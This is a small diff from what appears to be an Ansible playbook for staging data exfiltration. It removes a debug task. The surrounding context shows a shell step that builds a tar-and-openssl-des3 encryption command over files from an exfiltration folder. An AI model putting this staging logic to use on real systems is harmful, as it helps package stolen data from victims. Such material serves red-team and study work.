@@ -21,8 +21,6 @@
       args:
         chdir: "{{ exfiltration_folder }}"
       register: exfil_files
-    - debug:
-        var: exfil_files
     - shell: |
         pwd > path
         echo tar czpf - {{ item }} | openssl des3 -salt -k {{ password_encryption }} >> path
